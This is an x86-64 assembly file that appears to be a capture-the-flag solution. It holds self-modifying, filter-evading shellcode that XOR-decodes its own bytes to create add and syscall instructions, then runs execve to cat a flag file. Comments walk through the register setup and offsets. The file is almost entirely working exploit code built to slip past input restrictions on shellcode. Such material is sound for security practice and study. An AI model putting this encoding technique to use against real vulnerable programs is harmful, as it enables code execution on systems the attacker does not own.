.intel_syntax noprefix
.global _start
.text

# Our goal is execve("/bin/cat", {"/bin/cat", "flag"}, NULL)
# This means we need:
# - syscall opcode
# - rax == 59 (__NR_execve)
# - rdi == "/bin/cat"
# - rsi == {"/bin/cat", "flag"} address
# - rdx == NULL
#
# Assumptions from debugging:
#   rdx,rsi contains the shellcode address
#   rdi is 0
#
# This shellcode starts at offset 0xca
_start:
    # Put the shellcode start address in rax
    push rdx
    pop rax

    # rbx = 0x58585858
    # We'll use it to XOR stuff later
    push 0x58585858
    pop rbx
    
    # Decode "encoded_add_opcodes1" to generate our own 'add' instruction
    xor al, 0x7f
    xor [rax+0x5f], rbx
    xor [rax+0x63], bl

    # rcx now holds page_base+0x7f, we'll use it as refrence later
    # for adding / xoring bytes in the shellcode
    push rax
    pop rcx

encoded_add_opcodes1:
    # Will be "add al, 0x20"
    .byte 0x66
    .byte 0x5d # Will be 0x05
    .byte 0x58 # Will be 0x00
    .byte 0x59 # Will be 0x01

    # Will be "add [rcx+0x66], bx"
    # (This will decode "encoded_add_opcode2")
    .byte 0x3e # Will be 0x66 
    .byte 0x59 # Will be 0x01 
    .byte 0x59
    .byte 0x66

encoded_add_opcode2:
    # Will be "add cl, 0x6a"
    .byte 0x28 # Will be 0xd1
    .byte 0x79 # Will be 0x80    
    .byte 0x6a

    # We have successfuly set up the following values:
    # Now rax = page_base + 0x7f + 0x100 == page_base+0x17f
    # Now rcx = page_base + 0xe9
    # This allows us to XOR values using rcx, but to fetch pointers
    # above page_base+0x100 using rax

    # Push, for rax later to be 0
    push rdi

    # xor the things to be xored:
    # xor the syscall
    xor [rcx + 0x20], bx # 0x109

    # xor the end of flags string
    xor [rcx + 0x26], bl # 0x10f

    # Move "/bin/cat" string to 1st argument (rdi)
    xor al, 0x6f
    push rax       # rax is 0x110
    pop rdi

    # Create array of pointers (will be NULL-terminated because of mmap)
    # 1) First move "/bin/cat" (which is in rdi) to the first location
    xor [rcx+0x60], rdi
    
    # 2) Now fetch "flag" and put in the second location
    xor al, 0x3b    # offset to "flag_path"
    xor al, 0x20
    xor [rcx+0x60+0x8], rax # rax is 0x10b

    # Now put in 2nd argument (rsi) the address of the array
    xor al, 0x42    # offset to array of pointers
    push rax
    pop rsi

    # Move syscall number to rax
    # __NR_execve == 59
    pop rax     # rax == 0 from rdi
    push rax    # for rdx later
    xor al, 59

    # Move NULL (0) to 3rd argument (rdx)
    pop rdx

    # Offset: this should be 0x109
    # This will be "syscall"
    .byte 0x57  # 0x0f
    .byte 0x5d  # 0x05

# Offset: this should be 0x10b
flag_path:
    .ascii "flag"

# this should be 0x10f
flag_path_null_terminator:
    .byte 0x58
